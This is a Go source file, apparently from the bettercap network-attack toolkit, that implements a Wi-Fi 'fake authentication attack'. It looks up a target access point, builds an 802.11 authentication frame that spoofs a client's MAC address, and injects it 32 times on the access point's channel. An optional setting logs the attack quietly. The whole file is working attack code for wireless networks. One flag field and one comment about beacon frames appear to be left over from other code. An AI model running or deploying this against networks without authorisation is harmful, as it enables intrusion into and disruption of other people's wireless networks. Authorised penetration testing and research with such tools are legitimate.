package wifi

import (
	"bytes"
	"fmt"
	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
	"net"
)


func (mod *WiFiModule) isFakeAuthSilent() bool {
	if err, is := mod.BoolParam("wifi.fake_auth.silent"); err != nil {
		mod.Warning("%v", err)
	} else {
		mod.csaSilent = is
	}
	return mod.csaSilent
}

func(mod *WiFiModule)sendFakeAuthPacket(bssid,client net.HardwareAddr){
	err,pkt:=packets.NewDot11Auth(client,bssid,0)
	if err!=nil{
		mod.Error("could not create authentication packet: %s", err)
		return
	}
	for i:=0;i<32;i++{
		mod.injectPacket(pkt)
	}
}

func (mod *WiFiModule) startFakeAuth(bssid,client net.HardwareAddr) error {
	// if not already running, temporarily enable the pcap handle
	// for packet injection
	if !mod.Running() {
		if err := mod.Configure(); err != nil {
			return err
		}
		defer mod.handle.Close()
	}

	var ap *network.AccessPoint = nil

	for _, _ap := range mod.Session.WiFi.List() {
		if bytes.Equal(_ap.HW, bssid) {
			ap = _ap
		}
	}

	if ap == nil {
		return fmt.Errorf("%s is an unknown BSSID", bssid.String())
	}

	mod.writes.Add(1)
	go func() {
		defer mod.writes.Done()

		if mod.Running() {
			logger := mod.Info
			if mod.isFakeAuthSilent() {
				logger = mod.Debug
			}
			logger("fake authentication attack in AP: %s client: %s", ap.ESSID(), client.String())
			// send the beacon frame with channel switch announce element id
			mod.onChannel(ap.Channel, func() {
				mod.sendFakeAuthPacket(bssid,client)
			})
		}
	}()
	return nil
}